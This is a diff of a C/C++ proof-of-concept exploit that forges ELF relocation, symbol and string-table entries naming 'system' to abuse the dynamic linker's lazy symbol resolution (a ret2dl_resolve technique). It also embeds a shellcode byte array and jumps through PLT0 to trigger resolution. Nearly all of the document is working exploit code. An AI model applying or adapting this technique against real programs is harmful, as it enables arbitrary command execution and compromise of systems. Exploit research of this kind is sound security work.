@@ -10,13 +10,12 @@
 #include <stdlib.h>
 #include <stdint.h>
 
-void Addressor(void)
+void Addressor()
 {
 	int a = 1;
 }
 
-static char FakeStack[128]; // For manual stack alignment
-static long FakeGOT[2]; // two elements for now
+static char FakeStack[128]; // For fake relocation and symbol table
 
 unsigned long AlignTo(unsigned long number, unsigned long multiple)
 {
@@ -99,7 +98,7 @@ Elf64_Dyn* GetDynamicSection(Elf64_Ehdr* ElfHeader)
 	return DynamicSection;
 }
 
-int main(void)
+int main()
 {
 	char Shellcode[128] = "\x48\x83\xec\x08\x48\x8d\x3d\xa9\x0f\x00\x00\x31\xc0\x48\xBF\x00\x00\x00\x00\x00\x00\x00\x00\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00\x50\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00\x50\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0\x31\xc0\x48\x83\xc4\x08\xc3\x0f\x1f\x80\x00\x00\x00\x00";
 	
@@ -119,29 +118,35 @@ int main(void)
 	//long* lmap = (long*)(GotPlt + 0x8);
 	//*(char*)(*lmap + 0x1d0) = 0;
 
-	long AlignedFakeStack = AlignTo(reinterpret_cast<unsigned long>(&FakeStack), 0x18);
-
-	char* FakeRelocationTable = reinterpret_cast<char*>(AlignedFakeStack);
+	char* FakeRelocationTable = reinterpret_cast<char*>(&FakeStack);
 	unsigned long reloc_arg = 0;
 	reloc_arg = AlignTo(FakeRelocationTable - reinterpret_cast<char*>(RelocationATable), 0x18); 
 	FakeRelocationTable = (reinterpret_cast<char*>(RelocationATable)) + reloc_arg; // Relocate FakeReloc to ensure that reloc_arg % 0x18 == 0
 	reloc_arg /= 0x18 ; // compact reloc_arg for dl_resolve
 
-	char* FakeSymbolTable = FakeRelocationTable + 0x10 + sizeof(Elf64_Rela);
+	char* FakeSymbolTable = IsRela ? FakeRelocationTable + sizeof(Elf64_Rela) : FakeRelocationTable + sizeof(Elf64_Rel);
 	const char* FakeStringTable = "system\x00";
 
-	unsigned long RealToFakeSymbolTableOffset = AlignTo(FakeSymbolTable - (char*)SymbolTable, 0x18);
+	unsigned long RealToFakeSymbolTableOffset = AlignTo(FakeSymbolTable - reinterpret_cast<char*>(SymbolTable), 0x18);
 	FakeSymbolTable = (char*)SymbolTable + RealToFakeSymbolTableOffset;
 	reinterpret_cast<Elf64_Sym*>(FakeSymbolTable)->st_other = 0x0;
 	reinterpret_cast<Elf64_Sym*>(FakeSymbolTable)->st_name = FakeStringTable - StringTable;
 
-	
-	reinterpret_cast<Elf64_Rela*>(FakeRelocationTable)->r_info = (( RealToFakeSymbolTableOffset / 0x18 ) << 32 ) | 0x7;
-	reinterpret_cast<Elf64_Rela*>(FakeRelocationTable)->r_offset = FakeSymbolTable - (char*)ElfHeader;
+	unsigned long FakeGOT = 0; // one element for PoC
+	if (IsRela)
+	{
+		reinterpret_cast<Elf64_Rela*>(FakeRelocationTable)->r_info = (( RealToFakeSymbolTableOffset / 0x18 ) << 32 ) | 0x7;
+		reinterpret_cast<Elf64_Rela*>(FakeRelocationTable)->r_offset = reinterpret_cast<char*>(&FakeGOT) - reinterpret_cast<char*>(ElfHeader);
+	}
+	else
+	{
+		reinterpret_cast<Elf64_Rel*>(FakeRelocationTable)->r_info = (( RealToFakeSymbolTableOffset / 0x18 ) << 32 ) | 0x7;
+		reinterpret_cast<Elf64_Rel*>(FakeRelocationTable)->r_offset = reinterpret_cast<char*>(&FakeGOT) - reinterpret_cast<char*>(ElfHeader);
+	}
+
 
 	long* PLT0 = reinterpret_cast<long*>(&GlobalOffsetTable[0x18]);
 	long JumpAddress = *PLT0+5;
-	//char* DataBufferAddress = reinterpret_cast<char*>(&dataBuf);
 
 	char* DataBufferAddress = dataBuf;
 	// emulate a function call
